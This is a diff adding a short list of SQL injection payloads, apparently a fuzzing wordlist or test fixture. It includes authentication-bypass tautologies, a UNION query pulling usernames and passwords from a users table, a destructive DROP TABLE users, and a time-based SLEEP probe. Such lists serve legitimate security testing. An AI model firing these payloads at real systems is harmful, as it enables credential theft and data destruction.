@@ -1,0 +1,8 @@
+' OR '1'='1'; --
+' UNION SELECT username, password FROM users; --
+' AND 1=2 UNION SELECT NULL, version(); --
+' OR 'x'='x
+' AND 'a'='a'; --
+1; DROP TABLE users; --
+' AND (SELECT COUNT(*) FROM users) > 0; --
+' AND SLEEP(5) -- 
